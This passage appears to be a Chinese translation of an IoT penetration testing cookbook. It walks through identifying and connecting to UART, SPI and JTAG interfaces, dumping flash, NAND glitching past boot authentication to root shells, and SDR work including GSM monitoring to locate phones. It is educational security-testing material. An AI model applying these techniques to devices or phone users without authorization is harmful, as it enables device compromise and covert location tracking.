现在我们对嵌入式设备中的不同组件有了很好的了解，让我们看看如何识别设备中存在的不同总线和接口。

为此，第一步是打开设备并查看 PCB。请注意，在本节中，我们只关心识别特定引脚、标头或芯片的用途，而不是实际连接到它，这是我们将在下一节中介绍的内容。

如何做...我们将首先寻找 UART，这是黑客最喜欢用来访问设备的接口之一。我们将首先查看 UART 的内部结构，然后是如何识别引脚排列，最后是如何连接到目标设备。

# UART 识别

在嵌入式设备中，我们首先要寻找的是**通用异步收发器**（**UART**）接口。UART 是嵌入式设备中最常见的通信协议之一。UART 基本上将其接收到的并行数据转换为串行数据流，这样更容易进行交互。

由于这里的另一个重点是减少线路的数量，因此在 UART 通信中没有时钟。相反，UART 依赖于**波特率**，即数据传输速率。UART 通信中的两个不同组件将同意指定的波特率，以确保数据以正确的格式接收。

此外，在 UART 通信中，还会添加另一个称为**奇偶校验位**的位，以便进行错误检测。因此，典型的 UART 通信顺序如下：

+   **起始位**：表示这是 UART 通信的开始。

+   **数据位**：这是需要传输的实际数据。

+   奇偶校验位：这用于错误检测。

+   **停止位**：用于指示 UART 数据流的结束。

如果您想自己尝试并了解 UART 数据流，可以使用逻辑分析仪并连接到 UART 端口（我们将在稍后识别），然后在逻辑分析仪软件中查看结果。可以使用的一种流行的逻辑分析仪是 Salae Logic，它有 8 通道和 16 通道两种选项。

以下屏幕截图显示了逻辑分析仪中数据的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4a6075de-45dc-4f32-be02-5b5e948b0ecd.png)

让我们继续看看实际设备中的 UART 端口是什么样子。以下是一些已在设备中识别出的 UART 端口的示例。请注意，要进行 UART 通信，两个引脚是必不可少的-发送（Tx）和接收（Rx）。此外，在大多数情况下，您还会发现另外两个引脚用于地线（GND）和 Vcc：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8eac5a14-3ba3-49d9-b16f-2ba15691ae9e.png)

如您在上图中所见，有四个相邻的引脚，这在这种情况下是 UART 引脚。在关于获取和接口化串行通信的下一节中，我们将看看如何识别确切的引脚布局-哪些引脚对应于 Tx、Rx 和 GND，并且还要接口化这些引脚/端口以访问设备。

# SPI 和 I2C 的识别

SPI 和 I2C 的识别类似于我们刚刚在 UART 通信识别中看到的。识别正在使用的通信协议是 SPI 还是 I2C 的一种方法是使用逻辑分析仪，并查看在通信中传输的各种位。

SPI 和 I2C 都属于串行通信，主要用于 Flash 和 EEPROM。正确识别正在使用的确切协议以及更多细节的一种方法是查看芯片名称并从数据表中获取信息。

以下是 SPI 闪存芯片的外观：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a0c2764c-d27e-40aa-a613-e7d51d3c2bf9.png)

图片来源：[`cdn-shop.adafruit.com/1200x900/1564-00.jpg`](https://cdn-shop.adafruit.com/1200x900/1564-00.jpg)

上图中的闪存芯片标签为 Winbond W25Q80BV，这意味着现在我们可以查阅其数据表并识别其各种属性-即使不知道它是 SPI 闪存芯片。

如果我们搜索芯片编号，我们将得到以下结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/fcba91d3-d9cc-49e1-ba1f-e59791a60444.png)

让我们继续打开搜索结果中找到的任何数据表 PDF。在数据表的开头，我们将找到以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8d76b63c-e7db-4511-ac16-7aeaf2b278d5.png)

这意味着我们的芯片是一颗带有 8MB 存储空间的 SPI 闪存芯片。随着我们在数据表中的进一步了解，我们还发现了其引脚布局，如下截图所示，告诉我们给定 SPI 闪存芯片的确切引脚布局：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b8f9c959-1bdf-46b8-9b0e-7e961068da02.png)

因此，我们已经能够正确识别芯片的用途、其属性以及其引脚布局。

有了这些信息，我们可以使用 Attify Badge 连接到 SPI 闪存芯片，这是一种用于处理各种硬件协议和标准（如 UART、JTAG、SPI 和 I2C）的工具。或者，您也可以使用 FTDI MPSSE 电缆。

将**数据输出**（**DO**）和**数据输入**（**DI**）分别连接到 Attify Badge 的 MOSI 和 MISO，或者，如果您使用 FTDI 电缆，则芯片的 DI 连接到电缆的 DO（黄色），芯片的 DO 连接到电缆的 DI（绿色）。此外，还将电缆的 Vcc、GND、WP 和 CS 连接到芯片上的相同引脚。

下图中的表格将帮助您在此阶段进行连接：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8190c765-09ec-4302-a59a-84cd0aea9ba0.png)

连接完成后，我们只需从位于[`github.com/devttys0/libmpsse`](https://github.com/devttys0/libmpsse)的 LibMPSSE 库中运行`spiflash.py`实用程序。以下截图也显示了这一点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0a0d4fb8-9c0c-4dfc-a71c-0ab86c27b599.png)

上述语法中的大小是从闪存芯片的数据表中获取的，并且闪存芯片的整个内容被放入名为`new.bin`的文件中。

因此，现在您可以查看 SPI 闪存芯片，找出其引脚布局，并从中转储数据，这可能是固件、硬编码密钥或其他敏感信息，具体取决于您正在使用的设备。

# JTAG 识别

为了识别设备上有趣的暴露接口，我们将寻找的最后一件事是**联合测试动作组**（**JTAG**）。

与以前的针床测试相比，JTAG 是一种更简化的测试引脚和调试引脚的方式。它使设备开发人员和测试人员能够确保设备上各个芯片中的每个引脚都能够按预期功能、互连和正常运行。

对于渗透测试人员来说，JTAG 有很多用途，从使我们能够读/写数据，甚至调试运行中的进程，到修改程序执行流程。

当我们寻找 JTAG 时，最重要的四个焊盘是**测试数据输入**（**TDI**）、**测试数据输出**（**TDO**）、**测试时钟**（**TCK**）和**测试模式选择**（**TMS**）。然而，在识别这些单独的焊盘之前，我们必须首先确定设备上 JTAG 头部的位置。

为了简化事情，JTAG 有几种标准接口选项，如 13 针、14 针、20 针等。以下是一些真实设备中 JTAG 接口的图像：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a571cc13-8bb0-4fd7-99c0-224c36bd5d79.png)

图像来源：https://www.dd-wrt.com/wiki/images/thumb/9/99/DLINK-DIR632_Board.png/500px-DLINK-DIR632_Board.png

以下是 Experia v8 Box 上的 JTAG 接口，带有焊接的 JTAG 头部：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e5f1935f-f04b-41bd-8ca6-17c5f62c3b78.png)

图像来源：http://www.alfredklomp.com/technology/experia-v8/

这里还要注意的一点是，即使你可能能够在标准的头部格式中找到 JTAG，但在一些真实设备中，你会发现 JTAG 焊盘分散在整个电路板上，而不是集中在一个位置。在这种情况下，你需要在焊盘上焊接排针/跳线，并将它们连接到 JTAGulator 上，以便确定它们是否是 JTAG 焊盘，以及哪个焊盘对应于哪个 JTAG 焊盘。

# 还有更多...

+   除了之前提到的接口和协议，你的目标设备可能还使用许多其他硬件通信协议。一些其他流行的通信技术包括 CAN、PCI、1-Wire 等。建议你研究更多的硬件通信协议，以更广泛地了解你可以分析协议的方式。

# 嵌入式设备的串行接口

由于我们已经在前一节中介绍了 UART 的基础知识，让我们直接进入如何与 UART 接口进行交互。

# 做好准备

一旦连接好，我们将看看如何在设备上找到 UART 焊盘后如何识别这些焊盘。

我们要找的四个焊盘如下：

+   Tx

+   Rx

+   GND

+   Vcc

为此，我们将使用**万用表**，它可以测量电压和电流，因此既可以作为电压表又可以作为电流表，因此得名为万用表。

以下是万用表的外观。按照以下图像所示连接探针：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f061597a-b724-4541-a1e5-c3ea6437dfd7.png)

# 如何操作...

连接好后，让我们继续找到不同的 UART 焊盘，就像下面的步骤描述的那样。

1.  确保万用表上的指针指向扬声器符号，就像下面的图像中所示的那样：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b06d22e4-8cd9-4ac9-a6a5-9caa1e456c1c.png)

确保你的设备已关闭。将黑色探针放在一个接地表面上——这可以是设备上的任何金属表面。

1.  将红色探针分别放在你认为是 UART 的四个焊盘上。再用其他焊盘重复此操作，直到听到蜂鸣声。

1.  你听到蜂鸣声的地方是设备上的 GND 焊盘。这个测试也被称为连续性测试，因为我们刚刚检查了两个 GND 焊盘之间的连续性——一个已知的和一个未知的。

既然我们已经确定了 GND 焊盘，让我们继续确定其他剩下的焊盘。

1.  将万用表指针放到 V - 20 位置，因为现在我们要测量电压。将黑色探针放在 GND 上，将红色探针移动到 UART 的其他焊盘上（除了 GND）。

在此阶段，重新启动设备并打开它。在您看到恒定高电压的引脚处是我们的 Vcc 引脚。

1.  接下来，再次重新启动设备，并测量除了在前面步骤中确定的 Vcc 和 GND 之外的其他引脚与 GND 之间的电压。由于在启动过程中最初进行的大量数据传输，您将在最初的 10-15 秒内注意到其中一个引脚上电压值的巨大波动。这个引脚将是我们的 Tx 引脚。

1.  Rx 可以通过在整个过程中具有最低电压波动和最低整体值的引脚来确定。

因此，我们已经确定了 UART 通信所需的所有引脚-Tx 和 Rx，以及 GND 和 Vcc。

1.  一旦您确定了设备的引脚布局，下一步将是将设备的 UART 引脚连接到 Attify Badge。在这里，您也可以使用其他设备代替 Attify Badge，例如 USB-TTL 或 Adafruit FT232H。

在这一点上，我们将关注 Attify Badge 上的引脚 D0 和 D1，分别对应于发送和接收。

目标设备的**发送**（**Tx**）将连接到 Attify Badge 的 Rx（D0），并且目标设备的 Rx 将连接到 Attify Badge 的 Tx（D1）。IP 摄像头的 GND 将连接到 Attify Badge 的 GND。

一旦我们完成了所有连接，下一步就是找出设备运行的波特率。将 Attify Badge 连接到系统并启动目标设备。

要识别波特率，我们将使用[`github.com/devttys0/baudrate/blob/master/baudrate.py`](https://github.com/devttys0/baudrate/blob/master/baudrate.py)上可用的`baudrate.py`实用程序。

1.  这可以通过以下命令运行：

```
sudo python baudrate.py
```

1.  一旦您进入波特率、屏幕，您可以使用上下箭头键切换波特率。在波特率处，如果您能够看到可读字符，那就是您目标设备的正确波特率。它应该看起来像以下屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a58f2f84-6507-4277-b250-cfd6e0db41b7.png)

1.  接下来，按下*Ctrl* + *C*，这将使用已识别的设置将您带到 minicom 实用程序。在这里按下*Enter*将授予您 shell 访问权限，前提是您的目标设备具有基于 UART 的 shell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b6fd8d08-8df1-4b6c-9b30-58929f0a3a49.png)

因此，我们能够利用暴露的 UART 接口，找出引脚和接口，并最终获得 root shell。

# 另请参阅

+   现在您已经可以访问目标设备的 UART 接口，还可以执行其他利用技术，例如后门和通过**微不足道的文件传输协议**（**TFTP**）转储整个文件系统。但是，这将因设备而异，并取决于您在已经受到攻击的设备上拥有的当前特权。

# NAND 故障

您可以在嵌入式设备上执行的另一件事情是利用基于故障的攻击来绕过安全措施（例如 UART 控制台上没有 root shell）。 

# 准备就绪

故障，顾名思义，是一种在您正在使用的系统中引入故障的方法。这可以通过多种方式完成，有专门的书籍和研究论文专门讨论这个主题。

现在，我们将简要介绍基于故障的攻击概述。这样做的目的是能够访问引导加载程序，这将允许我们更改敏感参数，例如启动参数，我们可以定义自己的参数，告诉系统启动 UART 控制台并带有登录提示/ shell 或以单用户模式启动系统，绕过身份验证。

# 如何做...

1.  我们将在这里看一下的故障称为**NAND 故障**，在这种故障中，我们将把设备的 NAND 闪存的一个 I/O 引脚短接到 GND 引脚。请注意，这种短接必须在引导加载程序启动并内核即将启动的那一刻执行。

因此，如果短接成功，内核将无法启动，从而导致您陷入默认的引导加载程序提示，使您能够更改引导加载程序参数。

1.  举个例子，通过在启动参数中添加`single`，您将能够登录到单用户模式，从而绕过某些系统上的身份验证要求。这也在下面的屏幕截图中显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/fc3295d7-d0ed-4124-ad13-1a57b0c43016.png)

图像来源：http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html

1.  类似地，在 Wink Hub 上执行相同的 NAND 故障将导致陷入引导加载程序（由`Exploitee.rs`团队发现），您可以更改参数，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/36dc0849-e954-4ec8-816c-f2570c056ed4.png)

1.  修改引导参数后，您将能够在下一次引导时通过 UART 访问根 shell，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e2c2773f-5ddc-47bb-aab9-dce2f3da4455.png)

图像来源：http://www.brettlischalk.com/assets/WinkHack/WinkRootShell.png

# 另请参阅

NAND 故障是利用故障攻击的技术之一。然而，您也可以使用电源和电压故障技术来执行诸如绕过加密等操作。

以下是一些其他有用的资源：

+   [`www2.cs.arizona.edu/~collberg/Teaching/466-566/2012/Resources/presentations/2012/topic1-final/report.pdf`](https://www2.cs.arizona.edu/~collberg/Teaching/466-566/2012/Resources/presentations/2012/topic1-final/report.pdf)

+   [`www.cl.cam.ac.uk/~sps32/ECRYPT2011_1.pdf`](https://www.cl.cam.ac.uk/~sps32/ECRYPT2011_1.pdf)

+   [`www.blackhat.com/docs/eu-15/materials/eu-15-Giller-Implementing-Electrical-Glitching-Attacks.pdf`](https://www.blackhat.com/docs/eu-15/materials/eu-15-Giller-Implementing-Electrical-Glitching-Attacks.pdf)

# JTAG 调试和利用

现在我们已经介绍了硬件设备上的各种利用技术，是时候介绍一种最重要的妥协设备的方法-JTAG 了。我们已经看到了 JTAG 是什么，JTAG 引脚通常是什么样子。

# 准备就绪

让我们开始识别给定目标设备上的 JTAG 引脚。为此，我们将使用 JTAGulator，这是由*Joe Grande*制作的硬件工具，用于识别 JTAG 引脚。

# 如何做到...

一旦您将所有 JTAGulator 通道连接到目标设备上预期的 JTAG 引脚，另外连接 GND 到 GND。

1.  使用以下代码启动屏幕：

```
sudo screen /dev/ttyUSB0 115200 
```

1.  然后，您将获得一个 JTAGulator 提示，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d2dbcf43-e00d-454e-b5a9-f6420da6a08a.png)

1.  我们要做的第一件事是设置目标设备的电压，在当前情况下是 3.3。要做到这一点，只需在屏幕上输入`V`，然后输入`3.3`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bca14d5f-2b80-419d-b111-fb0a303d5508.png)

1.  设置目标电压后，我们可以通过按下*B*来运行一个旁路扫描，以找出当前连接中的 JTAG 引脚。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a8d393cf-f317-4ead-b8cb-a44647eb262c.png)

正如您所看到的，JTAGulator 能够识别 JTAG 引脚，并告诉我们各个引脚对应的是什么。

1.  现在我们已经确定了引脚布局，下一步是将引脚布局连接到 Attify Badge（或 FTDI C232HM MPSSE 电缆），如下所示：

1.  目标的 TDI 连接到 Attify Badge（或 FTDI 电缆的黄色）的 D1（TDI）

1.  目标的 TDO 连接到 Attify Badge（或 FTDI 电缆的绿色）的 D2（TDO）

1.  目标的 TMS 连接到 Attify Badge（或 FTDI 电缆的棕色）的 D3（TMS）

1.  目标的 TCK 连接到 Attify Badge（或 FTDI 电缆的橙色）的 D0（TCK）

1.  一旦您完成了所需的连接，下一步就是使用 Attify Badge（或 FTDI C232HM MPSSE 电缆）的配置文件以及目标设备的芯片运行 OpenOCD。配置文件可以在安装后从`OpenOCD`目录中获取，并位于`openocd/tcl/target`。

1.  OpenOCD 可以按照以下截图所示运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ba0145d1-6b71-450e-8049-bf31a89c68fc.png)

1.  正如您所看到的，OpenOCD 已经识别出链中的两个设备，并且还在端口`4444`上启用了 Telnet，我们现在可以连接到该端口，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2dce679f-6465-47d2-b18d-15a826d1e49b.png)

在这一步，您可以执行各种 OpenOCD 命令，以及针对您的特定芯片的命令，以便妥协设备。

# 另请参阅

通过使用`mdw`命令从给定内存位置读取数据，您可以利用通过 JTAG 访问设备的能力做一些事情，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b6c226f3-a33f-4f3d-b158-9c9fe9fb65cb.png)

另一个例子是通过连接到端口`3333`上运行的实例，使用我们在前几章学到的技能来连接到 GDB 以调试运行中的进程，并进行 ARM/MIPS 利用。


# 第七章：无线电黑客

在本章中，我们将涵盖以下内容：

+   熟悉 SDR

+   SDR 工具的实践

+   理解和利用 ZigBee

+   深入了解 Z-Wave

+   理解和利用 BLE

# 介绍

几乎所有当前物联网设备与其他设备进行交互以交换信息并采取行动。了解物联网设备使用的无线协议以及影响它们的安全问题对于有效地对物联网设备进行渗透测试至关重要。

无线通信或无线电简单地是通过空气这种通信介质使用电磁波从源到目的地传输数据的一种方式。无线电信号是在常见设备中使用的信号，如微波、光和红外线；只是在每种情况下，信号的波长和频率不同。在无线通信的情况下，需要传输的数据首先通过电势差转换为电信号，然后由载波波传输，最后在另一端解调以获取源发送的实际数据。我们不会详细讨论电磁概念以及如何从数据生成电信号，因为这超出了本章的范围。

物联网设备使用各种无线通信协议，从蜂窝到 Wi-Fi 不等，取决于产品要求和设备制造商的偏好。不可能在单一章节或书籍中涵盖所有各种无线通信协议，但是，我们将专注于整体渗透测试方法论，并涵盖两种最常见的协议——ZigBee 和蓝牙低功耗（BLE）。

不同的无线协议有各自的目的和优缺点。它们每个都在指定的频率（或频率范围）上运行，并且需要不同的渗透测试硬件和软件设置，以便能够分析该通信协议的数据包。

在进入各个协议之前，我们将深入研究软件定义无线电（SDR），这是无线电逆向和物联网设备黑客的最重要概念之一。我们还将熟悉各种基础概念，以便更好地理解无线电黑客和 SDR。

# 熟悉 SDR

SDR 是一种极其有用的技术，我们可以通过它改变给定无线电设备的用途。正如其名称所示，这种情况下的无线电是软件定义的，这意味着无线电的功能或操作可以根据我们的需求进行更改和修改。这与传统无线电不同，传统无线电设备根据其硬件设计只能服务于单一目的。

这为我们打开了大量机会，因为我们可以开始使用 SDR，并不断重新定位以满足我们的各种需求。重新定位在这里简单地意味着，假设我们正在分析 FM 频谱，我们可以让设备来做，如果以后我们想要分析 433 MHz 的物联网设备发送的数据，我们可以使用同一设备来捕获数据，处理数据，并提取其中发送的文本。

到目前为止，你应该对 SDR 是什么以及它可以服务于什么目的有一个相当好的理解。在进行实际的 SDR 实践和分析不同事物之前，在本节中，我们将熟悉一些基本概念和术语，这些术语可能在你深入研究无线电黑客和 SDR 时会遇到。

# 无线电中的关键术语

让我们快速了解一些你在 SDR 中经常遇到的术语。

一个简单的无线电系统将包括几个组件，如发送器、接收器、载波波和介质。这些组件基本上就是您所期望的。发送器是发送信号的组件，由传输介质传输到接收器。

在大多数实际情况下，需要发送的数据波会与载波波调制，然后发送到接收器，接收器会解调调制波以恢复原始数据波。

有许多调制类型，如频率调制、幅度调制和相位调制。此外，还有许多数字调制技术，如**开关键控**（**OOK**）、**相移键控**（**PSK**）、**频移键控**（**FSK**）和**幅度键控**（**ASK**）。

在使用无线电系统时，您将遇到一些常见术语，如下所示：

+   **波长**：在无线电术语中，这意味着波形中两个连续波峰（高点）或两个连续波谷（低点）之间的距离。

+   **频率**：顾名思义，指事件发生的频率。

+   **增益**：这是新处理信号的信噪比与原始信号的信噪比之间的比率。

+   **滤波器**：这可以从无线电信号中去除不必要或不需要的组件。它可以是各种类型，如高通滤波器（只允许超过一定阈值的信号通过滤波器）、低通滤波器（只允许低于一定阈值的信号通过滤波器）和带通滤波器（只允许在给定频率范围内的信号通过滤波器）。

+   **采样**：这涉及将连续信号转换为具有多个独立值的离散时间信号。如预期的那样，如果采样率不正确，信号将显得不完整或失真，并可能导致不正确的计算。

+   **奈奎斯特定理**：在这种情况下，如果采样频率至少是信号带宽的两倍，任何信号都可以用离散样本表示。

+   **模数转换器**（**ADC**）/**数模转换器**（**DAC**）：这将模拟信号转换为数字信号，反之亦然。

现在我们对各种无线电术语有了很好的理解，让我们开始看一些工具，用这些工具我们可以玩 SDR 并将其用于安全研究目的。

# 使用 SDR 工具

在本节中，我们将介绍用于 SDR 和无线电信号分析的最常用工具。我们将从最基本的工具开始，然后使用它来从无线电数据包中提取更多信息。

# 做好准备

要进行基于 SDR 的安全研究，需要以下工具：

+   硬件：

+   RTL-SDR

+   软件：

+   GQRX

+   GNU Radio 伴侣

要安装这些工具，以下存储库具有最佳的构建说明。

确保构建 GNU Radio 伴侣，而不是从`apt-get`安装，以获得更好的 SDR 工作体验。

SDR 安全研究也取决于您系统的性能。确保为您执行这些任务的虚拟机分配了足够的 RAM。如果可能的话，使用 Ubuntu 实例作为主机以获得最佳体验。

# 如何做...

RTL-SDR 是 SDR 世界中最好的设备之一。它最初是一种带有 Realtek 芯片组的电视调谐器，可用于许多基于无线电的活动。这些设备的频率各不相同，通常在 22 MHz-1.7 GHz 范围内。

# 分析 FM

1.  为了开始 SDR，我们将首先使用 RTL-SDR 查看频谱。这将让我们更好地理解一切是如何运作的，并开始对基于 SDR 的设备进行侦察。

1.  为此，将你的 RTL-SDR 插入系统。如果你正在使用虚拟机，请确保 RTL-SDR 连接到你的虚拟机。

1.  接下来，打开 GQRX 并在初始启动菜单中选择 RTL-SDR 设备。在这里，你可以看到我们有不同的部分：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/027bbb50-5d18-4f1e-a62b-56449c9dced2.png)

在顶部部分，你可以使用上下箭头键或输入你想要调谐 RTL-SDR 的频率。

在频率部分之后，我们有频谱部分。在这里，你可以看到哪些频率最活跃，当你使用基于无线电的物联网设备时，也可以注意到它们的尖峰。我们稍后会更深入地讨论这个问题。

接下来是瀑布部分，显示了活动与时间的关系。这意味着你可以看到几秒前哪个频率有通信活动。

在右侧部分，我们有接收器选项、输入控制和 FFT 设置，这些是各种配置，将帮助你更好地分析你的数据。然而，为了简单起见，我们不会详细介绍它们。所有的窗格都可以根据需要进行修改和定制。

在这个第一个练习中，我们将通过调谐到一个当地的 FM 电台并在 GQRX 中接收音频来听取其中的内容。

1.  为此，让我们首先将模式更改为宽 FM 立体声，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/570c9f3a-51c8-42b7-8890-52817095fd02.png)

1.  一旦你做到了，将频率更改为你当地的 FM 电台频率范围如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b6cc2a9b-2a29-4907-9ffc-f4ef01626c35.png)

1.  一旦你点击捕获按钮，你将能够看到一个频谱，在多个地方有尖峰。这些尖峰代表了那个频率范围的活动：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f5f840e8-92ac-4671-9c54-99cf71b3e28c.png)

如果你调谐到一个有效的 FM 电台后现在从扬声器中听到声音，你将能够在那个频率听到 FM 广播。

# RTL-SDR 用于 GSM 分析

你也可以使用 RTL-SDR 进行许多其他用途。其中一个用途是进行蜂窝分析，如下所示。我们将使用 RTL-SDR 来查找各种手机用户的确切位置详细信息。然后可以使用单向天线来增加范围并收集大量信息。

1.  为此，启动`grgsm_livemon`，可以从[`github.com/ptrkrysik/gr-gsm/`](https://github.com/ptrkrysik/gr-gsm/)下载。如下截图所示启动它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5d6531f4-0b80-45a4-bca7-9aa853fe7652.png)

1.  这将打开一个`grgsm_livemon`的屏幕，允许你改变增益和频率以查看频谱：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bd7bd4f6-e65f-4110-99b5-8900f0a9dd66.png)

那么我们如何得到在蜂窝网络上发生活动的频率。为此，我们将使用一个叫做 Kalibrate 的实用工具，它是一个 GSM 频率识别器，可以从[`github.com/ttsou/kalibrate`](https://github.com/ttsou/kalibrate)获取。

1.  一旦你有了 Kalibrate，指定要扫描的频段——在这种情况下，我们正在扫描 GSM900 并设置增益为 40.0 dB：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/95314674-b781-4ebd-87c9-3f608d57b628.png)

1.  它告诉我们在 956.4 MHz + 9.829 kHz 有大量的流量。让我们启动 GQRX，看看这个频率，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0cac46df-fff1-4ff8-a86f-d78dc0605ac5.png)

1.  果然，在确定的频率上确实有很多活动。现在我们已经得到了想要观察的频率，让我们回到 GRGSM，设置这个频率，并进一步分析：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d79d9f0f-4333-49e0-97cc-72d7ee7022b1.png)

1.  我们也可以在 Gr-gsm 中看到相同类型的流量。现在，为了进一步分析，我们需要在 Wireshark 上查看环回`lo`接口上的流量。正如预期的那样，我们能够在这里看到一些有趣的信息。应用`gsmtap`过滤器以过滤出对我们相关的消息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bc323f6c-f768-4e7c-8568-f7bd3ef17ad5.jpg)

1.  正如你所看到的，我们已经使用**移动国家代码**（**MCC**）、**移动网络代码**（**MNC**）和**位置区域代码**（**LAC**）确定了这部手机的位置，现在我们可以使用 CellidFinder 等实用程序在地图上找到手机最近的基站：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8ee447dc-547c-4467-b49e-62742e780745.png)

这就是你可以使用 RTL-SDR 进行各种不同目的的方法，以及分析从正常 FM 到飞行交通甚至到蜂窝交通的许多事物。

# 使用 GNU Radio

现在，在以前的情况下，一切都只是关于查看频率和分析它，然而，并不是太深入。如果我们有一个传输原始无线电流量的物联网设备，并且我们想要了解幕后发生了什么，并找出它实际传输了什么数据，该怎么办。

为此，我们将使用一个名为 GNU Radio-companion 的实用程序，它允许我们构建无线电块以处理各种无线电信号。在这个实用程序中，你可以选择一个输入源（如 RTL-SDR 源、Osmocom 源、HackRF 源和信号发生器），并在其上应用无线电块，最后将输出存储在原始 wav 文件中或在图表中绘制出来。

在这个练习中，我们正在研究一个气象站，我们将使用 RTL-SDR 源捕获数据，然后执行解调和时钟恢复，以找到气象站实际发送的数据。

要找出设备操作的频率，我们可以使用 GQRX，并在它传输数据时寻找频率峰值。另一个选择是寻找 FCC ID——制造商在美国销售设备所需的标准——它执行重要的放射性。这些信息通常位于设备的标签之一上。

一旦我们有了 FCC ID，我们可以去`fccid.io`并输入`FCC-ID`，这将向我们显示设备正在使用的确切频率：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/698a2181-2933-4bbc-aa4b-c465c0f1b881.png)

既然我们知道了频率，让我们去 GNU Radio-companion 并创建一个处理来自气象站的数据的工作流程。我们不会深入研究 GNU Radio-companion 及其各种属性，但我们强烈建议您自行探索，并尝试使用各种其他无线电捕获。

以下是我们要添加的块：

+   **Osmocom 源**：这可以帮助你从 RTL-SDR 获取无线电数据包，并将它们传递给以下块。

+   **复杂到 Mag²**：这可以帮助你将复杂数据类型转换为实数，不考虑诸如相位角之类的对我们目前不重要的事物。

+   **乘以常数**：这可以帮助你增加接收到的输出数据的强度，因为原始数据可能极低。5 或 10 的值会很好。

+   **文件接收器**：这可以帮助你将输出放入一个文件中，然后可以在 audacity 中进行分析。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9fe5f846-5cfe-4aec-926b-a9a3741aeb69.png)

双击 Osmocom 源以更改其属性，并设置我们之前确定的频率。

还要双击 Wav 文件接收器并给它一个输出文件名。

现在我们准备运行这个。一旦我们运行这个，我们将有一个名为`monitor.wav`的新文件。将文件作为原始文件导入 audacity。在这一步，这看起来像是 OOK；我们需要将这些数据转换为可理解的实际数据。其中一种方法是让较短的脉冲间隔表示数字零，较长的脉冲间隔表示数字一。这也显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4cef0e57-aa81-4f65-8cd4-1b3976005b29.png)

如果我们进一步分析数据，现在可以看到气象站发送的确切数据，包括温度和湿度数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b818cbd7-a1f9-48cc-b1a2-64c9598f7f1c.png)

# 还有更多...

还有许多围绕 RTL-SDR 和整体 SDR 黑客技术构建的其他实用程序，可以用于许多目的。例如，ADS-B 项目允许您实时跟踪飞行，RTL-433 用于处理 433 MHz 信号，还有其他实用程序可用于利用诸如钥匙扣之类的东西。

# 理解和利用 ZigBee

ZigBee 是物联网设备中常用的无线协议之一，因为它能够形成网状网络并以低功耗和资源消耗执行操作。它已经在许多垂直领域中得到应用，包括智能家居、工业控制系统（ICS）、智能建筑控制等。在大多数国家，它在 2.4 GHz 运行，在美国和澳大利亚是 902 到 928 MHz，在欧洲是 868 到 868.6 MHz。

在本节中，我们将研究 ZigBee，看看我们如何识别周围的 ZigBee 设备，并嗅探和重放流量以识别安全问题。

# 准备工作

要使用 ZigBee，需要以下设置：

+   **硬件**：Atmel RzRaven USB Stick 刷入了 KillerBee 固件

+   **软件**：KillerBee

